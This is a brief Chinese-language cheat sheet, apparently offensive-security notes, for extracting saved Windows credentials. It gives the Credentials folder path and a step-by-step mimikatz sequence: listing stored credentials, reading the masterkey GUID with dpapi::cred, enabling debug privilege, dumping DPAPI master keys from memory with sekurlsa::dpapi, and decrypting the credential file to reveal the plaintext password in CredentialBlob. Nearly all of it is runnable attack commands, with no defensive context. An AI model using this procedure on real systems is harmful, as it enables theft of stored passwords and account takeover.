	位置
	C:\Users\用户名\AppData\Local\Microsoft\Credentials
	查看命令
	>cmdkey /list
	>mimikatz log
	#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015
	记录guidMasterKey: {572115f2-80b1-4b1e-be1b-425f5c7a8bfd}
	#privilege::debug
	#sekurlsa::dpapi
	找到GUID为guidMasterKey的值下面的MasterKey: d928f5e02d2e9495f92bb…
	#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015 /masterkey: d928f5e02d2e9495f92bb…
	密码为CredentialBlob值。
